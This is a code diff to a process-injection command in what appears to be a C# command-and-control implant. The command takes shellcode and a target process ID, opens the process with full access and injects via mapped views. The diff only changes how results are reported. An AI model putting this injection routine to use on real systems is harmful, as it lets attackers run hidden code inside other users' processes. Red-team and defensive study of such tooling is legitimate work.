@@ -24,7 +24,7 @@ namespace Engineer.Commands
             {
                 if (task.File.Length < 1)
                 {
-                    Tasking.FillTaskResults("No shellcode provided",task,EngTaskStatus.FailedWithWarnings);
+                    Tasking.FillTaskResults("No shellcode provided",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
                 //convert from base64 string to byte array
@@ -32,7 +32,7 @@ namespace Engineer.Commands
 
                 if (!task.Arguments.TryGetValue("/pid", out string pid))
                 {
-                    Tasking.FillTaskResults("No pid provided",task,EngTaskStatus.FailedWithWarnings);
+                    Tasking.FillTaskResults("No pid provided",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                     return;
                 }
                 int pidInt = int.Parse(pid.TrimStart(' '));
@@ -41,14 +41,14 @@ namespace Engineer.Commands
                 IntPtr processPointer = WinAPIs.Kernel32.OpenProcess(WinAPIs.Kernel32.ProcessAllFlags, false, pidInt);
                 if (MapViewLoadShellcode(shellcode, processPointer))
                 {
-                    Tasking.FillTaskResults("process injected",task,EngTaskStatus.Complete);
+                    Tasking.FillTaskResults("process injected",task,EngTaskStatus.Complete,TaskResponseType.String);
                     return;
                 }
-                Tasking.FillTaskResults("Failed to inject, if owned by another user make sure current process is in high integrity or has seDebug privs",task,EngTaskStatus.FailedWithWarnings);
+                Tasking.FillTaskResults("Failed to inject, if owned by another user make sure current process is in high integrity or has seDebug privs",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
             }
             catch(Exception e)
             {
-                Tasking.FillTaskResults(e.Message,task,EngTaskStatus.Failed);
+                Tasking.FillTaskResults(e.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
             }
         }
 
